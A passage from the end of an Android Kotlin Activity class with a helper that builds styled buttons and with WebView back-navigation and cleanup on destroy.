    private fun dp(v: Int) = (v * resources.displayMetrics.density).toInt()

    private fun btn(txt: String, cor: String, action: () -> Unit) = Button(this).apply {
        text = txt; setTextColor(Color.WHITE); textSize = 13f; typeface = Typeface.DEFAULT_BOLD
        isAllCaps = false; background = roundRect(cor); setPadding(0, dp(14), 0, dp(14))
        setOnClickListener { action() }
        layoutParams = LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.WRAP_CONTENT).apply { topMargin = dp(8) }
    }

    override fun onBackPressed() { if (webView.canGoBack()) webView.goBack() else super.onBackPressed() }
    override fun onDestroy() { super.onDestroy(); webView.destroy(); handler.removeCallbacksAndMessages(null) }
}
